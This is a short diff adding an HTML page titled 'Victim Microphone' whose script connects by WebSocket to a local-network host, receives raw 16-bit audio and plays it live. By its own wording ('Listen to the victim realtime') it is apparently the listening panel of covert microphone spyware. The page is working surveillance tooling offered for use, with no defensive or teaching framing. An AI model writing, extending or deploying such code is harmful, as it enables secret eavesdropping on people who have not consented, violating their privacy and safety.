@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Victim Microphone</title>
+</head>
+<body>
+<h1>Listen to the victim realtime</h1>
+<script>
+const wsAudio = new WebSocket('ws://192.168.88.104:8766');
+wsAudio.binaryType = 'arraybuffer';
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+const bufferSize = 1024;
+const scriptNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
+scriptNode.connect(audioCtx.destination);
+let queue = [];
+scriptNode.onaudioprocess = e => {
+  const output = e.outputBuffer.getChannelData(0);
+  if (queue.length > 0) {
+    const chunk = queue.shift();
+    for (let i = 0; i < chunk.length; i++) {
+      output[i] = chunk[i];
+    }
+  } else {
+    output.fill(0);
+  }
+};
+wsAudio.onmessage = event => {
+  const arrayBuffer = event.data;
+  const dataView = new DataView(arrayBuffer);
+  const float32 = new Float32Array(dataView.byteLength / 2);
+  for (let i = 0; i < float32.length; i++) {
+    float32[i] = dataView.getInt16(i * 2, true) / 32768; 
+  }
+  queue.push(float32);
+};
+</script>
+</body>
+</html>
